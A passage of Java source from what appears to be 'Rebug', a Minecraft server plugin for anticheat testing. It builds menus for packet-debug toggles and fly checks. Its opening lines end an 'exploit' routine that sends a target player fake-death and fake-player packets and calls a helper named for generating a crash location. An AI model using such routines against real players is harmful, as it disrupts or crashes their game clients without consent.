 		if (exploit.equalsIgnoreCase("fake death")) 
 		{
 			PT.SendPacket(target, new PacketPlayOutEntityStatus(px, (byte) 3));
 		}
 		if (exploit.equalsIgnoreCase("Test"))
 		{
 			TeleportUtils.GenerateCrashLocation(target);
 		}
 		if (exploit.equalsIgnoreCase("Spawn Player"))
 		{
 			target.setNoDamageTicks(Integer.MAX_VALUE);
 			px.setInvisible(true);
 			PT.SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
 			PT.SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
 			PT.SendPacket(target, new PacketPlayOutNamedEntitySpawn(PT.getEntityHuman(target)));
 		}
 		sendMessage("Tried using the " + exploit + " Exploit on " + target.getName());
 	}
    public ItemStack getMadeItems (String ItemName, User user)
    {
    	ItemStack order = null;
    	if (user == null || PT.isStringNull(ItemName)) return order;
    	
    	ArrayList<String> lore = new ArrayList<>();
    	lore.clear();
    	ItemMeta itemMeta = null;
    	
    	switch (ItemName.toLowerCase())
    	{
		case "%user-info%":
			order = Reset(Material.BOOK_AND_QUILL);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.DARK_PURPLE + "User " + ChatColor.GRAY + user.getName());
			lore.add("AntiCheat " + user.getColoredAntiCheat());
			lore.add("Client Brand " + ChatColor.GRAY + user.getBrand());
			lore.add("Version " + ChatColor.GRAY + PT.getPlayerVersion(user.getProtocol()) + " (" + PT.getPlayerVersion(user.getPlayer()) + ")");
			String world = user.getWorld().getName();
			world = world.length() > 5 ? world = PT.SubString(world, 5, world.length()).replace("_", "").replace("theend", "The End") : world;
			world = world.equalsIgnoreCase("the end") ? world : world.replace(PT.SubString(world, 0, 1), PT.SubString(world, 0, 1).toUpperCase());
			lore.add("World " + ChatColor.GRAY + world);
			itemMeta.setLore(lore);
			break;
			
		case "%delete_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 14);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Delete Item!");
			break;
			
		case "%debug_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 1);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Debug Item!");
			break;

		default:
			break;
		}
    	if (order != null)
    		order.setItemMeta(itemMeta);
    	
    	return order;
    }
    // TODO Pre Made Items
	public ItemStack getMadeItems(String menuName, String itemName)
	{
		switch (menuName.toLowerCase())
		{
		case "packet selector":
			if (itemName.equalsIgnoreCase("PacketPlayInFlying"))
			{
				FlyingPacket =! FlyingPacket;
				item = Reset(FlyingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((FlyingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInFlying");
	    		lore.add(ChatColor.GRAY + "Click to " + (!FlyingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInPosition"))
			{
				PositionPacket =! PositionPacket;
				item = Reset(PositionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((PositionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPosition");
	    		lore.add(ChatColor.GRAY + "Click to " + (!PositionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInPositionLook"))
			{
				PositionLookPacket =! PositionLookPacket;
				item = Reset(PositionLookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((PositionLookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPositionLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!PositionLookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInLook"))
			{
				LookPacket =! LookPacket;
				item = Reset(LookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((LookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!LookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInArmAnimation"))
			{
				ArmAnimationPacket =! ArmAnimationPacket;
				item = Reset(ArmAnimationPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((ArmAnimationPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInArmAnimation");
	    		lore.add(ChatColor.GRAY + "Click to " + (!ArmAnimationPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInHeldItemSlot"))
			{
				HeldItemSlotPacket =! HeldItemSlotPacket;
				item = Reset(HeldItemSlotPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((HeldItemSlotPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInHeldItemSlot");
	    		lore.add(ChatColor.GRAY + "Click to " + (!HeldItemSlotPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInBlockDig"))
			{
				DiggingPacket =! DiggingPacket;
				item = Reset(DiggingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((DiggingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockDig");
	    		lore.add(ChatColor.GRAY + "Click to " + (!DiggingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInBlockPlacement"))
			{
				BlockPlacePacket =! BlockPlacePacket;
				item = Reset(BlockPlacePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((BlockPlacePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockPlacement");
	    		lore.add(ChatColor.GRAY + "Click to " + (!BlockPlacePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInEntityAction"))
			{
				EntityActionPacket =! EntityActionPacket;
				item = Reset(EntityActionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((EntityActionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInEntityAction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!EntityActionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInCloseWindow"))
			{
				CloseWindowPacket =! CloseWindowPacket;
				item = Reset(CloseWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((CloseWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCloseWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!CloseWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInClickWindow"))
			{
				ClickWindowPacket =! ClickWindowPacket;
				item = Reset(ClickWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((ClickWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClickWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!ClickWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSettings"))
			{
				SettingsPacket =! SettingsPacket;
				item = Reset(SettingsPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((SettingsPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSettings");
	    		lore.add(ChatColor.GRAY + "Click to " + (!SettingsPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInClientStatus"))
			{
				StatusPacket =! StatusPacket;
				item = Reset(StatusPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((StatusPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClientStatus");
	    		lore.add(ChatColor.GRAY + "Click to " + (!StatusPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInAbilities"))
			{
				AbilitiesPacket =! AbilitiesPacket;
				item = Reset(AbilitiesPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((AbilitiesPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInAbilities");
	    		lore.add(ChatColor.GRAY + "Click to " + (!AbilitiesPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInKeepAlive"))
			{
				KeepAlivePacket =! KeepAlivePacket;
				item = Reset(KeepAlivePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((KeepAlivePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInKeepAlive");
	    		lore.add(ChatColor.GRAY + "Click to " + (!KeepAlivePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInTransaction"))
			{
				TransactionPacket =! TransactionPacket;
				item = Reset(TransactionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((TransactionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTransaction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!TransactionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSpectate"))
			{
				SpectatePacket =! SpectatePacket;
				item = Reset(SpectatePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((SpectatePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSpectate");
	    		lore.add(ChatColor.GRAY + "Click to " + (!SpectatePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSteerVehicle"))
			{
				SteerVehiclePacket =! SteerVehiclePacket;
				item = Reset(SteerVehiclePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((SteerVehiclePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSteerVehicle");
	    		lore.add(ChatColor.GRAY + "Click to " + (!SteerVehiclePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInCustomPayLoad"))
			{
				CustomPayLoadPacket =! CustomPayLoadPacket;
				item = Reset(CustomPayLoadPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((CustomPayLoadPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCustomPayLoad");
	    		lore.add(ChatColor.GRAY + "Click to " + (!CustomPayLoadPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInTabComplete"))
			{
				TabCompletePacket =! TabCompletePacket;
				item = Reset(TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((TabCompletePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTabComplete");
	    		lore.add(ChatColor.GRAY + "Click to " + (!TabCompletePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			
			break;
		
		case "vanilla fly checks":
			if (itemName.equalsIgnoreCase("1.8.x"))
			{
				Vanilla1_8FlyCheck =! Vanilla1_8FlyCheck;
				item = Reset(Vanilla1_8FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.8.x");
				lore.add(ChatColor.AQUA + "Status: " + (Vanilla1_8FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + Vanilla1_8FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.8.x Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("1.9+"))
			{
				Vanilla1_9FlyCheck =! Vanilla1_9FlyCheck;
				item = Reset(Vanilla1_9FlyCheck ? Material.BAKED_POTATO : Material.POTATO_ITEM);
				itemMeta.setDisplayName(ChatColor.ITALIC + "1.9+");
				lore.add(ChatColor.AQUA + "Status: " + (Vanilla1_9FlyCheck ? ChatColor.GREEN : ChatColor.DARK_RED) + Vanilla1_9FlyCheck);
				lore.add(ChatColor.AQUA + "Description:" + ChatColor.RESET + " Enable/Disable 1.9+ Fly check");
				lore.add(ChatColor.AQUA + "In Development!");
				itemMeta.setLore(lore);
				item.setItemMeta(itemMeta);
				return item;
			}
			break;
			
		default:
			break;
		}
		return null;
	}
	public boolean hasPermission (String perm) 
	{
		return getPlayer().hasPermission(perm);
	}
	public boolean isOnLadder() 
	{
		return getLocation().getBlock().getType() == Material.LADDER || getLocation().getBlock().getType() == Material.VINE;
	}
	@SuppressWarnings("deprecation")
	public void DebuggerChatMessage (PacketReceiveEvent e, String toDebug)
	{
		if (PT.isStringNull(toDebug)) return;
		
		int debuggercounter = Rebug.PacketDebuggerPlayers.get(getPlayer().getUniqueId());
		TextComponent component = new TextComponent(ChatColor.BOLD.toString() + ChatColor.DARK_GRAY + "| " + ChatColor.RED + "DEBUGGER " + ChatColor.DARK_GRAY + ">> " + "[" + debuggercounter + "] " + e.getPacketName());
		BaseComponent[] baseComponents = new ComponentBuilder(e.getPacketName() + ":\n\n" + toDebug).create();
		HoverEvent hoverEvent = new HoverEvent(HoverEvent.Action.SHOW_TEXT, baseComponents);
		component.setHoverEvent(hoverEvent);
		getPlayer().spigot().sendMessage(component);
		Rebug.PacketDebuggerPlayers.put(getPlayer().getUniqueId(), debuggercounter + 1);
	}
}
